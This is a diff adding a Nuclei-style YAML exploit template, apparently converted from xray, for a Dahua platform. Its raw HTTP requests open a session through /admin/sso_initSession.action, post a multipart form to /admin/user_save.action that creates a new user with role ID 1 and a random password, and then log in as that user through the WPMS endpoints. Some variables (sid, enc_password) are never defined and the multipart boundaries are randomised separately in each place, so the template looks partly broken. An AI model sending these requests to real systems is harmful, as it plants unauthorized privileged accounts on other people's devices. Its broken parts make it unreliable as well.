@@ -1,0 +1,107 @@
+id: poc-yaml-dahua-sso_initSession_action-create_user
+
+info:
+  name: poc-yaml-dahua-sso_initSession_action-create_user
+  author: xray-converter
+  severity: medium
+  tags: xray-converted
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=103
+
+http:
+  - raw:
+      - |
+        GET /admin/sso_initSession.action HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /admin/user_save.action HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: JSESSIONID={{sid}}
+        Content-Type: multipart/form-data; boundary=----{{rand_base(8)}}
+
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="userBean.userType"
+        
+        0
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="userBean.ownerCode"
+        
+        001
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="userBean.isReuse"
+        
+        0
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="userBean.macStat"
+        
+        0
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="userBean.roleIds"
+        
+        1
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="userBean.loginName"
+        
+        {{rand_base(8)}}
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="displayedOrgName"
+        
+        {{rand_base(8)}}
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="userBean.loginPass"
+        
+        {{rand_base(8)}}
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="checkPass"
+        
+        {{rand_base(8)}}
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="userBean.groupId"
+        
+        0
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="userBean.userName"
+        
+        {{rand_base(8)}}
+        ------{{rand_base(8)}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /WPMS/getPublicKey HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"loginName":"{{rand_base(8)}}"}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /WPMS/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"loginName":"{{rand_base(8)}}","loginPass":"{{enc_password}}","timestamp":"16853622671401904168273612873678126378126387"}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
